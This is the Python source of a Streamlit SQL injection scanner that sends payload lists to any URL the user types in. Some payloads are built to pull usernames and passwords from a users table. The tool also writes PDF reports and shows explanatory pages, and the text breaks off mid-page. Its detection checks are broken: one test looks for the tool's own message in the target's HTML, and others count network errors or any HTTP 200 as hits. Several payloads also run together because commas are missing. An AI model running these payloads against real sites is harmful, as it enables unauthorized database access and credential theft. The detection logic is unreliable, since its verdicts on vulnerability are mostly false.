import streamlit as st
import requests
import re
import time
import io
import os
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas

output_stream = io.BytesIO()  # Define output stream outside the function


def generate_report(vulnerability_type, url, vulnerability_detected, payload):
    # Generate PDF report
    pdf_filename = f"Report_{vulnerability_type}.pdf"
    output_path = os.path.join(os.getcwd(), pdf_filename)  # Get the absolute path of the PDF file
    c = canvas.Canvas(output_path, pagesize=letter)

    # Set font styles
    title_font = "Helvetica-Bold"
    title_font_size = 16
    content_font = "Helvetica"
    content_font_size = 12

    # Write report content
    c.setFont(title_font, title_font_size)
    c.drawString(50, 700, f"SQL Injection Report - {vulnerability_type}")

    c.setFont(content_font, content_font_size)
    c.drawString(50, 650, f"URL: {url}")

    if vulnerability_type == "Union-based SQLi":
        c.drawString(50, 600, "Union Based SQLi Report")
        c.drawString(50, 570, f"Vulnerability Detected: {vulnerability_detected}")
        if vulnerability_detected:
            c.drawString(50, 540, f"Payload: {payload}")
        else:
            c.drawString(50, 540, "Tested every payload available, No vulnerability Found")
        # Add given content
        content = [
            "1. Vulnerability Type: Union-based SQL Injection",
            "Union-based SQL injection is a technique where an attacker exploits a vulnerability in a web",
            "application's database layer by injecting malicious SQL code. This technique takes advantage",
            "of the UNION SQL operator, which allows combining the result sets of two or more SELECT ",
            "statements."
            "",
            "",
            "2. Test Process",
            "The code performs the following steps to test for Union-based SQL injection vulnerabilities:",
            "- The user is prompted to enter a target URL through a Streamlit interface.",
            "- Upon clicking the 'Start' button, the code initiates the Union-based SQL injection test for the",
            "  provided URL.",
            "- It uses a list of predefined SQL injection payloads designed for Union-based SQL injection attacks.",
            "- For each payload, the code sends an HTTP GET request to the target URL with the payload injec-",
            "  ted in the 'id' parameter.",
            "- The response from the server is examined for evidence of a successful SQL injection.",
            "- If the response contains the pattern '2', which indicates a successful injection, the code marks  ",
            "  it as a Union-based SQL injection vulnerability.",
            "- The testing process stops as soon as a vulnerability is detected to avoid unnecessary testing.",
            "",
            "3. Test Results",
            "The code presents the test results in the Streamlit app interface:",
            "- If a Union-based SQL injection vulnerability is detected, the app displays a message in red, ",
            "  indicating the detection of the vulnerability.",
            "- If a no Union-based SQL injection vulnerability is detected, the app displays a message in ",
            "  green, indicating that no detection of the vulnerability."
        ]
        y = 500  # Starting y-coordinate for content
        line_height = 14  # Height of each line

        for line in content:
            c.drawString(50, y, line)
            y -= line_height

    elif vulnerability_type == "Error-based SQLi":
        c.drawString(50, 600, "Error Based SQLi Report ")
        c.drawString(50, 570, f"Vulnerability Detected: {vulnerability_detected}")
        if vulnerability_detected:
            c.drawString(50, 540, f"Payload: {payload}")
        else:
            c.drawString(50, 540, "Tested every payload available, No vulnerability Found")
        # Add given content
        content = [
            "1. Vulnerability Type: Error-Based SQL Injection",
            "Error-Based SQL injection is a technique where an attacker exploits a vulnerability in a web",
            "application's database layer by injecting malicious SQL code that causes the application to",
            "generate error messages containing sensitive information.",
            "",
            "2. Test Process",
            "The code performs the following steps to test for Error-Based SQL injection vulnerabilities:",
            "- The user is prompted to enter a target URL through a Streamlit interface.",
            "- Upon clicking the 'Start' button, the code initiates the Error-Based SQL injection test for the",
            "  provided URL.",
            "- It uses a list of predefined SQL injection payloads designed for Error-Based SQL injection attacks.",
            "- For each payload, the code sends an HTTP GET request to the target URL with the payload injected ",
            "  in the 'id' parameter.",
            "- The code handles any exceptions that occur during the request, such as RequestException from the",
            "  requests library.",
            "- If an exception is raised, it indicates that an error occurred during the execution of the injected",
            "  SQL code,potentially revealing a vulnerability.",
            "- The code marks it as an Error-Based SQL injection vulnerability and displays a message in the",
            "  Streamlit app interface.",
            "- The testing process stops as soon as a vulnerability is detected to avoid unnecessary testing.",
            "",
            "3. Test Results",
            "The code presents the test results in the Streamlit app interface:",
            "- If a Union-based SQL injection vulnerability is detected, the app displays a message in red, ",
            "  indicating the detection of the vulnerability.",
            "- If a no Error-based SQL injection vulnerability is detected, the app displays a message in ",
            "  green, indicating that no detection of the vulnerability."
        ]

        y = 500  # Starting y-coordinate for content
        line_height = 14  # Height of each line

        for line in content:
            c.drawString(50, y, line)
            y -= line_height

    elif vulnerability_type == "Time-based Blind SQLi":
        c.drawString(50, 600, "Time Based Blind SQLi Report ")
        c.drawString(50, 570, f"Vulnerability Detected: {vulnerability_detected}")
        if vulnerability_detected:
            c.drawString(50, 540, f"Payload: {payload}")
        else:
            c.drawString(50, 540, "Tested every payload available, No vulnerability Found")
        # Add given content
        content = [
            "1. Vulnerability Type: Time-Based Blind SQL Injection",
            "Time-Based Blind SQL injection is a technique where an attacker exploits a vulnerability in a web",
            "application's database layer by injecting malicious SQL code that causes delays in the application's",
            "response. By observing the time taken for the application to respond, an attacker can infer ",
            "information about the underlying database.",
            "",
            "2. Test Process",
            "The code performs the following steps to test for Time-Based Blind SQL Injection vulnerabilities:",
            "- The user is prompted to enter a target URL through a Streamlit interface.",
            "- Upon clicking the 'Start' button, the code initiates the Time-Based Blind SQL injection test",
            "  for the provided URL.",
            "- It uses a list of predefined SQL injection payloads designed for Time-Based Blind SQL injection",
            "  attacks.",
            "- For each payload, the code sends an HTTP GET request to the target URL with the payload",
            "  injected in the 'id' parameter.",
            "- The code measures the time taken for the response to be received.",
            "- If the response time exceeds a certain threshold (in this case, 5 seconds), it indicates a ",
            "  potential Time-Based Blind SQL injection vulnerability.",
            "- The code marks it as a Time-Based Blind SQL injection vulnerability and displays a message",
            "  in the Streamlit app interface."
            "- The testing process stops as soon as a vulnerability is detected to avoid unnecessary testing.",
            "",
            "3. Test Results",
            "The code presents the test results in the Streamlit app interface:",
            "- If a Time-Based Blind SQL injection vulnerability is detected, the app displays a message in ",
            "  red, indicating the detection of the vulnerability.",
            "- If a no Time-Based Blind SQL injection vulnerability is detected, the app displays a message ",
            "  in green, indicating that no detection of the vulnerability."
        ]

        y = 500  # Starting y-coordinate for content
        line_height = 14  # Height of each line

        for line in content:
            c.drawString(50, y, line)
            y -= line_height

    elif vulnerability_type == "Boolean-based Blind SQLi":
        c.drawString(50, 600, "Boolean Based Blind SQLi Report ")
        c.drawString(50, 570, f"Vulnerability Detected: {vulnerability_detected}")
        if vulnerability_detected:
            c.drawString(50, 540, f"Payload: {payload}")
        else:
            c.drawString(50, 540, "Tested every payload available, No vulnerability Found")
        # Add given content
        content = [
            "1. Vulnerability Type: Boolean-Based Blind SQL Injection",
            "Boolean-Based Blind SQL injection is a technique where an attacker exploits a vulnerability in a web",
            "application's database layer by injecting malicious SQL code that generates boolean-based responses ",
            "(true or false). By analyzing the application's responses, an attacker can infer information about ",
            "the underlying database.",
            "",
            "2. Test Process",
            "The code performs the following steps to test for Boolean-Based Blind SQL Injection vulnerabilities:",
            "- The user is prompted to enter a target URL through a Streamlit interface.",
            "- Upon clicking the 'Start' button, the code initiates the Boolean-Based Blind SQL injection test",
            "  for the provided URL.",
            "- It uses a list of predefined SQL injection payloads designed for Boolean-Based Blind SQL injection",
            "  attacks.",
            "- For each payload, the code sends an HTTP GET request to the target URL with the payload",
            "  injected in the 'id' parameter.",
            "- The code analyzes the application's response to determine if it contains a true or false condition.",
            "- If the response indicates a true condition, it implies a potential Boolean-Based Blind SQL",
            "  injection vulnerability.",
            "- The code marks it as a Boolean-Based Blind SQL injection vulnerability and displays a message",
            "  in the Streamlit app interface."
            "- The testing process stops as soon as a vulnerability is detected to avoid unnecessary testing.",
            "",
            "3. Test Results",
            "The code presents the test results in the Streamlit app interface:",
            "- If a Boolean-Based Blind SQL injection vulnerability is detected, the app displays a message in ",
            "  red, indicating the detection of the vulnerability.",
            "- If a no Boolean-Based Blind SQL injection vulnerability is detected, the app displays a message in ",
            "  green, indicating that no detection of the vulnerability."
        ]

        y = 500  # Starting y-coordinate for content
        line_height = 14  # Height of each line

        for line in content:
            c.drawString(50, y, line)
            y -= line_height

    elif vulnerability_type == "Content-based Blind SQLi":
        c.drawString(50, 600, "Content Based Blind SQLi Report ")
        c.drawString(50, 570, f"Vulnerability Detected: {vulnerability_detected}")
        if vulnerability_detected:
            c.drawString(50, 540, f"Payload: {payload}")
        else:
            c.drawString(50, 540, "Tested every payload available, No vulnerability Found")
        # Add given content
        content = [
            "1. Vulnerability Type: Content-Based Blind SQL Injection",
            "Content-Based Blind SQL injection is a technique where an attacker exploits a vulnerability in",
            "a web application's database layer by injecting malicious SQL code and analyzing the content or ",
            "behavior of the application's responses to infer information about the underlying database.",
            "",
            "2. Test Process",
            "The code performs the following steps to test for Content-Based Blind SQL Injection vulnerabilities:",
            "- The user is prompted to enter a target URL through a Streamlit interface.",
            "- Upon clicking the 'Start' button, the code initiates the Content-Based Blind SQL injection test",
            "  for the provided URL.",
            "- It uses a list of predefined SQL injection payloads designed for Content-Based Blind SQL injection",
            "  attacks.",
            "- For each payload, the code sends an HTTP GET request to the target URL with the payload",
            "  injected in the 'id' parameter.",
            "- The code analyzes the content or behavior of the application's response to determine if it ",
            "  indicates a successful injection."
            "- If the response exhibits specific patterns or behaviors associated with successful SQL injections,",
            "  it implies a potential Content-Based Blind SQL injection vulnerability.",
            "- The code marks it as a Content-Based Blind SQL injection vulnerability and displays a message",
            "  in the Streamlit app interface."
            "- The testing process stops as soon as a vulnerability is detected to avoid unnecessary testing.",
            "",
            "3. Test Results",
            "The code presents the test results in the Streamlit app interface:",
            "- If a Content-Based Blind SQL injection vulnerability is detected, the app displays a message in ",
            "  red, indicating the detection of the vulnerability.",
            "- If a no Content--Based Blind SQL injection vulnerability is detected, the app displays a message in ",
            "  green, indicating that no detection of the vulnerability."
        ]

        y = 500  # Starting y-coordinate for content
        line_height = 14  # Height of each line

        for line in content:
            c.drawString(50, y, line)
            y -= line_height

    elif vulnerability_type == "Out-of-band Blind SQLi":
        c.drawString(50, 600, "Out-of-band Blind SQLi Report ")
        c.drawString(50, 570, f"Vulnerability Detected: {vulnerability_detected}")
        if vulnerability_detected:
            c.drawString(50, 540, f"Payload: {payload}")
        else:
            c.drawString(50, 540, "Tested every payload available, No vulnerability Found")
        # Add given content
        content = [
            "1. Vulnerability Type: Out-of-band Blind SQL Injection",
            "Out-of-band Blind SQL injection is a technique where an attacker exploits a vulnerability in a web",
            "application's database layer by injecting malicious SQL code and leveraging out-of-band channels to",
            "extract information or perform actions on the database.",
            "",
            "2. Test Process",
            "The code performs the following steps to test for Out-of-band Blind SQL Injection vulnerabilities:",
            "- The user is prompted to enter a target URL through a Streamlit interface.",
            "- Upon clicking the 'Start' button, the code initiates the Out-of-band Blind SQL injection test",
            "  for the provided URL.",
            "- It uses a list of predefined SQL injection payloads designed for Out-of-band Blind SQL injection",
            "  attacks.",
            "- For each payload, the code sends an HTTP GET request to the target URL with the payload",
            "  injected in the 'id' parameter.",
            "- The code may perform additional out-of-band actions to exploit the vulnerability. ",
            "  xamples of such actions include logging the response, sending an email with the response,",
            "  or performing a custom action with the response.",
            "- If the response from the target URL indicates a successful injection, such as a specific HTTP",
            "  status code (e.g., 200), it implies a potential Out-of-band Blind SQL injection vulnerability.",
            "- The code marks it as a Out-of-band Blind SQL injection vulnerability and displays a message",
            "  in the Streamlit app interface."
            "- The testing process stops as soon as a vulnerability is detected to avoid unnecessary testing.",
            "",
            "3. Test Results",
            "The code presents the test results in the Streamlit app interface:",
            "- If a Out-of-band SQL injection vulnerability is detected, the app displays a message in ",
            "  red, indicating the detection of the vulnerability.",
            "- If a no Out-of-band Blind SQL injection vulnerability is detected, the app displays a message in ",
            "  green, indicating that no detection of the vulnerability."
        ]

        y = 500  # Starting y-coordinate for content
        line_height = 14  # Height of each line

        for line in content:
            c.drawString(50, y, line)
            y -= line_height

    c.save()

    # Create a download button for the PDF report
    with open(output_path, 'rb') as file:
        pdf_data = file.read()

    with st.expander("Download Report"):
        download_button_str = f"Download {pdf_filename}"
        st.download_button(download_button_str, pdf_data, file_name=pdf_filename)


# Function to test union-based SQLi
def test_union_based_sqli(url):
    # SQL injection payloads for union-based SQLi
    payloads = [
        "1' UNION SELECT 1,2,3;--",
        "1' UNION SELECT table_name, column_name, null FROM information_schema.columns;--",
        "1' UNION SELECT username, password, null FROM users;--",
        "1' UNION SELECT name, address, phone FROM customers;--",
        "1' UNION SELECT title, author, content FROM articles;--",
        "1' UNION SELECT product_name, price, description FROM products;--",
        "1' UNION SELECT employee_name, salary, department FROM employees;--"
    ]
    vulnerability_detected = False
    payload = None

    # Iterate over the payloads
    for payload in payloads:
        # Make an HTTP GET request with the injection and payload
        response = requests.get(url, params={'id': payload})

        # Extract the server's response
        html = response.text

        # Check the response for evidence of SQL injection
        if re.search(r'\b2\b', html):
            vulnerability_detected = True
            break  # Stop further testing if vulnerability is found

        # Check the response for evidence of SQL injection
    if vulnerability_detected:
        st.markdown('<span style="color: red;">Union-based SQL injection vulnerability detected!</span>',unsafe_allow_html=True)
        st.write(
            "The system iterates over a list of predefined SQL injection payloads designed for union-based SQL injection attacks."
            " Since the payload given is vulnerable, it detected the vulnerability")
    else:
        st.markdown('<span style="color: green;">No Union-based SQL injection vulnerability detected!</span>',unsafe_allow_html=True)
        st.write(
            "The system iterates over a list of predefined SQL injection payloads designed for union-based SQL injection attacks."
            "If the regular expression pattern is not matched for any of the payloads, meaning there is no evidence of a successful injection."
            "However, it's important to note that the absence of detection does not guarantee no vulnerability. If the database contains a different pattern from the given payloads, there might still be a chance of a vulnerability.")

    generate_report("Union-based SQLi", url, vulnerability_detected, payload)

    # Function to test time-based SQLi

def test_time_based_sqli(url):
    payloads = [
        "1' AND SLEEP(5);--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))dummy);--",
        "1' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=97, SLEEP(5), 0);--",
        "1' AND IF(LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1))=5, SLEEP(5), 0);--",
        "1' AND SLEEP(5) AND '1'='1",
        "1' AND (SELECT COUNT(*) FROM users WHERE username = 'admin' AND SLEEP(5)) > 0;--",
        "1' AND (SELECT CASE WHEN (SELECT username FROM users WHERE id = 1) = 'admin' THEN SLEEP(5) ELSE 0 END);--"
        "1' AND BENCHMARK(5000000, MD5(CHAR(115, 111, 109, 101, 118, 97, 108, 117, 101)));--",
        "1' AND (SELECT CASE WHEN (SUBSTRING((SELECT database()), 1, 1) = CHAR(97)) THEN (SELECT BENCHMARK(5000000, MD5(CHAR(115, 111, 109, 101, 118, 97, 108, 117, 101)))); ELSE 0 END);--",
        "1' AND IF(ORD(MID((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1), 1, 1)) = 97, BENCHMARK(5000000, MD5(CHAR(115, 111, 109, 101, 118, 97, 108, 117, 101))), 0);--"
    ]

    vulnerability_detected = False


    for payload in payloads:
        start_time = time.time()
        response = requests.get(url, params={'id': payload})
        end_time = time.time()
        elapsed_time = end_time - start_time

        if elapsed_time >= 5:
            st.markdown('<span style="color: red;">Time-based Blind SQL injection vulnerability detected!</span>', unsafe_allow_html=True)
            st.write(
                "The system iterates over a list of predefined SQL injection payloads designed for Time-based Blind SQL injection attacks."
                " Since the payload given is vulnerable it detected the vulnerability")
            vulnerability_detected = True
            break

    if not vulnerability_detected:
        st.markdown('<span style="color: green;">No Time-based Blind SQL injection vulnerability detected!</span>', unsafe_allow_html=True)
        st.write("The system iterates over a list of predefined SQL injection payloads designed for Time-based Blind SQL injection attacks."
                 "If the regular expression pattern is not matched for any of the payloads, meaning there is no evidence of a successful injection.")
        st.write("However, it's important to note that the absence of detection does not guarantee no vulnerability, if the database contains different pattern from the given payloads there might a chance still exist")

    generate_report("Time-based Blind SQLi", url, vulnerability_detected, payload)
# functions to test error-based SQLi

def test_error_based_sqli(url):
    payloads = [
        "1' AND (SELECT 1/0 FROM users);--",
        "1' AND (SELECT 1/0 FROM information_schema.tables);--",
        "1' AND (SELECT 1/0 FROM information_schema.columns);--",
        "1' AND (SELECT 1/0 FROM information_schema.schemata);--",
        "1' AND (SELECT 1/0 FROM pg_sleep(5));--",
        "1' AND (SELECT 1/0 FROM pg_statistic);--",
        "1' AND (SELECT 1/0 FROM pg_stat_all_tables);--"
    ]

    vulnerability_detected = False

    for payload in payloads:
        try:
            response = requests.get(url, params={'id': payload})
        except requests.exceptions.RequestException:
            st.markdown('<span style="color: red;">Error-based SQL injection vulnerability detected!</span>', unsafe_allow_html=True)
            st.write(
                "The system iterates over a list of predefined SQL injection payloads designed for Error-based SQL injection attacks."
                " Since the payload given is vulnerable it detected the vulnerability")
            vulnerability_detected = True
            break

    if not vulnerability_detected:
        st.markdown('<span style="color: green;">No Error-based SQL injection vulnerability detected!</span>', unsafe_allow_html=True)
        st.write(
            "The system iterates over a list of predefined SQL injection payloads designed for Error-based SQL injection attacks."
            "If the regular expression pattern is not matched for any of the payloads, meaning there is no evidence of a successful injection.")
        st.write("However, it's important to note that the absence of detection does not guarantee no vulnerability, if the database contains different pattern from the given payloads there might a chance still exist")

    generate_report("Error-based SQLi", url, vulnerability_detected, payload)
# functions to test Boolean-based SQLi

def test_boolean_based_sqli(url):
    payloads = [
        "1' AND 1=1;--",
        "1' AND 1=0;--",
        "1' AND (SELECT COUNT(*) FROM users) > 0;--",
        "1' AND (SELECT COUNT(*) FROM users) = 0;--",
        "1' AND EXISTS(SELECT * FROM users WHERE username='admin');--",
        "1' AND EXISTS(SELECT * FROM users WHERE username='nonexistent');--",
        "1' AND (SELECT CASE WHEN (SELECT username FROM users WHERE id = 1) = 'admin' THEN 1 ELSE 0 END);--",
        "1' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN 1 ELSE 0 END);--",
        "1' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users) = 0 THEN 1 ELSE 0 END);--",
        "1' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) > 0 THEN 1 ELSE 0 END);--",
        "1' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) = 0 THEN 1 ELSE 0 END);--"
    ]

    vulnerability_detected = False

    for payload in payloads:
        response = requests.get(url, params={'id': payload})
        html = response.text

        if "Union-based SQL injection vulnerability detected!" in html:
            st.markdown('<span style="color: red;">Boolean-basedBlind SQL injection vulnerability detected!</span>', unsafe_allow_html=True)
            st.write(
                "The system iterates over a list of predefined SQL injection payloads designed for Boolean-based Blind SQL injection attacks."
                " Since the payload given is vulnerable it detected the vulnerability")
            vulnerability_detected = True
            break

    if not vulnerability_detected:
        st.markdown('<span style="color: green;">No Boolean-based Blind SQL injection vulnerability detected!</span>', unsafe_allow_html=True)
        st.write(
            "The system iterates over a list of predefined SQL injection payloads designed for Boolean-based Blind SQL injection attacks."
            "If the regular expression pattern is not matched for any of the payloads, meaning there is no evidence of a successful injection.")
        st.write("However, it's important to note that the absence of detection does not guarantee no vulnerability, if the database contains different pattern from the given payloads there might a chance still exist")

    generate_report("Boolean-based Blind SQLi", url, vulnerability_detected, payload)

#function to test content-based blind

def test_content_based_blind_sqli(url):
    payloads = [
        "1' AND EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password, 1, 1) = 'a');--",
        "1' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND LENGTH(password) > 5);--",
        "1' AND IF((SELECT username FROM users WHERE id=1)='admin' AND LENGTH(password) > 5, 1, 0);--"
        "1' AND (SELECT CASE WHEN (SUBSTRING((SELECT database()), 1, 1)) = 'a' THEN SLEEP(5) ELSE 0 END);--",
        "1' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM information_schema.tables) > 0 THEN SLEEP(5) ELSE 0 END);--",
        "1' AND (SELECT CASE WHEN (SELECT username FROM users WHERE id = 1) LIKE 'a%' THEN SLEEP(5) ELSE 0 END);--"

    ]

    vulnerability_detected = False

    for payload in payloads:
        response = requests.get(url, params={'id': payload})

        # Check the response content to determine if the injection was successful
        if b'Some content indicating successful injection' in response.content:
            st.markdown('<span style="color: red;">Content-based Blind SQL injection vulnerability detected!</span>', unsafe_allow_html=True)
            st.write(
                "The system iterates over a list of predefined SQL injection payloads designed for Content-based Blind SQL injection attacks."
                " Since the payload given is vulnerable it detected the vulnerability")
            vulnerability_detected = True
            break

    if not vulnerability_detected:
        st.markdown('<span style="color: green;">No Content-based Blind  SQL injection vulnerability detected!</span>', unsafe_allow_html=True)
        st.write(
            "The system iterates over a list of predefined SQL injection payloads designed for Content-based Blind SQL injection attacks."
            "If the regular expression pattern is not matched for any of the payloads, meaning there is no evidence of a successful injection.")
        st.write(
            "However, it's important to note that the absence of detection does not guarantee no vulnerability, if the database contains different pattern from the given payloads there might a chance still exist")

    generate_report("Content-based Blind SQLi", url, vulnerability_detected, payload)

# function to test out of band

def test_out_of_band_sqli(url):
    payloads = [
        "1' AND extractvalue(1, CONCAT(0x7e, (SELECT @@version), 0x7e));--",
        "1' AND updatexml(null, concat(0x7e, (SELECT @@version), 0x7e), null);--",
        "1' AND exp(~(SELECT*FROM(SELECT CONCAT(0x7e, (SELECT @@version), 0x7e))x));--",
        "1' AND (SELECT*FROM(SELECT(SLEEP(5)))a);--",
        "1' AND (SELECT*FROM(SELECT(CASE WHEN (SELECT COUNT(*) FROM users) = 5 THEN SLEEP(5) ELSE 0 END))b);--"
        "1' AND (SELECT*FROM(SELECT(SELECT CONCAT(0x7e, (SELECT @@version), 0x7e)))c);--",
        "1' AND (SELECT*FROM(SELECT(SELECT CASE WHEN (SELECT COUNT(*) FROM users) = 5 THEN SLEEP(5) ELSE 0 END))d);--",
        "1' AND (SELECT*FROM(SELECT(IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)))e);--",
        "1' AND (SELECT*FROM(SELECT(COALESCE(CAST((SELECT column_name FROM information_schema.columns WHERE table_name=0x7573657273 LIMIT 0,1) AS CHAR),0x20)))f);--",
        "1' AND (SELECT*FROM(SELECT(IF((ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name=0x7573657273 LIMIT 0,1),1,1)))>97,SLEEP(5),0))))g);--"
    ]

    vulnerability_detected = False

    for payload in payloads:
        response = requests.get(url, params={'id': payload})

        # Perform out-of-band actions here
        # Example 1: Logging the response
        # Example 2: Sending an email with the response
        # Example 3: Performing a custom action with the response

        if response.status_code == 200:
            st.markdown('<span style="color: red;">Out-of-band Blind SQL injection vulnerability detected!</span>', unsafe_allow_html=True)
            st.write(
                "The system iterates over a list of predefined SQL injection payloads designed for Out-of-band Blind SQL injection attacks."
                " Since the payload given is vulnerable it detected the vulnerability")
            vulnerability_detected = True
            break

    if not vulnerability_detected:
        st.markdown('<span style="color: green;">No Out-of-band Blind SQL injection vulnerability detected!</span>', unsafe_allow_html=True)
        st.write(
            "The system iterates over a list of predefined SQL injection payloads designed for Out-of-band Blind SQL injection attacks."
            "If the regular expression pattern is not matched for any of the payloads, meaning there is no evidence of a successful injection.")
        st.write(
            "However, it's important to note that the absence of detection does not guarantee no vulnerability, if the database contains different pattern from the given payloads there might a chance still exist")

    generate_report("Out-of-band Blind SQLi", url, vulnerability_detected, payload)

# Streamlit app

def main():


    page = st.sidebar.radio("Navigation", ["Home", "Union Info Page" , "Error Info Page" , "Time Info Page" , "Boolean Info Page" , "Content Info Page" , "Out-of-band Info Page"])

    if page == "Home":
        st.markdown("<h1 style='text-align: center;'>AUTO-WT TOOL</h1>", unsafe_allow_html=True)

        # User input area for URL
        url = st.text_input("Enter the URL:")

        # Combo box to select vulnerability type
        vulnerability_type = st.selectbox("Select SQL Injection Vulnerability Type:",
                                          ['Union-based SQLi', 'Error-based SQLi', 'Time-based Blind SQLi', 'Boolean-based Blind SQLi', 'Content-based Blind SQLi', 'Out-of-band Blind SQLi'])

        # 'Start' button to initiate the test
        if st.button("Start"):
            if vulnerability_type == 'Union-based SQLi':
                test_union_based_sqli(url)
            elif vulnerability_type == 'Time-based Blind SQLi':
                test_time_based_sqli(url)
            elif vulnerability_type == 'Error-based SQLi':
                test_error_based_sqli(url)
            elif vulnerability_type == 'Boolean-based Blind SQLi':
                test_boolean_based_sqli(url)
            elif vulnerability_type == 'Content-based Blind SQLi':
                test_content_based_blind_sqli(url)
            elif vulnerability_type == 'Out-of-band Blind SQLi':
                test_out_of_band_sqli(url)

                # Generate report



        # 'Clear' button to clear the results
        if st.button("Clear"):
            st.empty()

        st.markdown('<p style="width: 100%; text-align: center;">NOTE: Please ensure that you have proper authorization and permission before conducting any security testing on real-world websites. Use this system for educational purposes.</p>', unsafe_allow_html=True)

    elif page == "Union Info Page":
        st.markdown("<h2 style='text-align: center;'>UNION-BASED SQL Injection</h2>", unsafe_allow_html=True)
        st.write(
            "Union-based SQL injection is a type of SQL injection attack where an attacker exploits a vulnerability in a web application's input validation mechanism to manipulate the underlying SQL query and retrieve unauthorized data from the database.\n"
            "The attacker's goal is to inject a malicious query fragment that retrieves additional data from a different table or performs arbitrary queries.\n\n"
            "Here's a step-by-step overview of how union-based SQL injection works:\n\n"
            "1. Identifying vulnerable input: The attacker identifies input fields in the web application that are vulnerable to SQL injection. These input fields typically accept user-supplied data that is directly used in constructing SQL queries without proper validation or sanitization.\n\n"
            "2. Injecting a UNION SELECT statement: The attacker injects a crafted SQL statement that includes a UNION SELECT clause into the vulnerable input field. The UNION SELECT clause allows the attacker to combine the result set of the injected query with the original query's result set.\n\n"
            "3. Exploiting the UNION operator: By using the UNION operator, the attacker can retrieve data from columns that they normally wouldn't have access to. The injected query typically selects columns with null values for the UNION SELECT statement, while the original query retrieves sensitive information from the database.\n\n"
            "4. Retrieving unauthorized data: When the manipulated SQL query is executed, the combined result set is returned to the attacker. This result set may contain sensitive information from the database, such as usernames, passwords, or other confidential data.")
        st.write("To prevent Union-Based SQL injection: \n\n"
        " 1. Using parameterized queries or prepared statements\n\n"
        " 2. Validating and sanitizing user input\n\n"
        " 3. Employing proper input filtering and encoding techniques\n\n"
        " 4. Regular security assessments")

    elif page == "Error Info Page":
        st.markdown("<h2 style='text-align: center;'>ERROR-BASED SQL Injection</h2>", unsafe_allow_html=True)
        st.write("Error-based SQL injection is a type of SQL injection attack where an attacker exploits vulnerabilities in a web application's input validation mechanism to extract information from the database or manipulate the SQL query's behavior by leveraging error messages generated by the database.\n\n"
                 "Here's a step-by-step overview of how error-based SQL injection works:\n\n"
                 "1. Identifying vulnerable input: The attacker identifies input fields in the web application that are vulnerable to SQL injection. These input fields typically accept user-supplied data that is directly used in constructing SQL queries without proper validation or sanitization.\n\n"
                 "2. Injecting malicious code: The attacker injects carefully crafted SQL statements into the vulnerable input fields. The injected code is designed to cause an error in the SQL query execution.\n\n"
                 "3. Triggering the error: The application sends the SQL query, including the injected code, to the database for execution. The injected code causes the database to generate an error during query execution.\n\n"
                 "4. The error message generated by the database is captured by the application and displayed to the attacker. The error message often contains valuable information about the database structure, such as table names, column names, or error stack traces.\n\n"
                 "5. Exploiting the vulnerability: Based on the extracted information, the attacker can further exploit the vulnerability. They may craft additional SQL queries to retrieve sensitive data from the database or manipulate the application's behavior to their advantage.")
        st.write("To prevent Error-Based SQL injection: \n\n"
                 " 1. Input validation and sanitization\n\n"
                 " 2. Error handling\n\n"
                 " 3. Least privilege principle\n\n"
                 " 4. Regular security assessments")
    elif page == "Time Info Page":
        st.markdown("<h2 style='text-align: center;'>TIME-BASED BLIND SQL Injection</h2>", unsafe_allow_html=True)
        st.write("Time-based blind SQL injection is a technique used by attackers to exploit vulnerabilities in web applications and manipulate the underlying SQL queries, even when there is no direct visible output or error messages. This type of SQL injection attack relies on the concept of time delays to extract information from the database.\n"
                 "The main challenge in defending against time-based blind SQL injection is that it doesn't typically produce visible errors or direct output, making it harder to detect and mitigate. "
                 "Here's a step-by-step overview of how time-based blind SQL injection works:\n\n"
                 "1. Identifying vulnerable input: The attacker identifies input fields in the web application that are susceptible to SQL injection. These input fields are typically used in constructing SQL queries without proper validation or sanitization.\n\n"
                 "2. Injecting a malicious payload: The attacker injects a crafted SQL payload into the vulnerable input field. The payload is designed to cause a time delay in the SQL query execution.\n\n"
                 "3. Observing the response time: After injecting the payload, the attacker analyzes the application's response time. If the response time is significantly delayed, it indicates that the injected payload affected the query execution and potentially exploited a vulnerability.\n\n"
                 "4. Extracting information through time delays: To extract information from the database, the attacker crafts SQL queries that reveal specific details through time delays. For example, the attacker may use conditional statements (e.g., IF or CASE) to check for true or false conditions that cause longer execution times.\n\n"
                 "5. Automated techniques: Attackers often employ automated tools or scripts to perform time-based blind SQL injection attacks. These tools automatically send requests with different payloads and analyze the response times to gather information systematically.")
        st.write("To prevent Time-Based Blind SQL injection: \n\n"
                 " 1. Input validation and sanitization\n\n"
                 " 2. Parameterized queries or prepared statements\n\n"
                 " 3. WAF and IDS/IPS\n\n"
                 " 4. Limit database privileges")
    elif page == "Boolean Info Page":
        st.markdown("<h2 style='text-align: center;'>BOOLEAN-BASED BLIND SQL Injection</h2>", unsafe_allow_html=True)
        st.write("Boolean-based SQL injection is a technique used by attackers to exploit vulnerabilities in a web application's database layer, specifically targeting SQL statements that rely on Boolean logic (true/false conditions). \n"
                 "The goal of this type of injection is to manipulate the application's SQL queries to retrieve unauthorized data or perform unintended actions\n\n. "
                 "Here's a step-by-step overview of how boolean-based blind SQL injection works:\n\n"
                 "1. Detecting the vulnerability: The attacker identifies a vulnerable parameter in a web application that is used in constructing SQL queries. This parameter is typically found in user input fields, such as search boxes, login forms, or any other input that interacts with the database.\n\n"
                 "2. Crafting malicious input: The attacker then crafts specially crafted input to manipulate the SQL query's logic. This input is designed to produce a specific Boolean expression that evaluates to either true or false, allowing the attacker to control the flow of the SQL query.\n\n"
                 "3. Submitting the payload: The crafted input is submitted to the vulnerable parameter of the application. The application will include the attacker's input in the SQL query without proper sanitization or validation.\n\n"
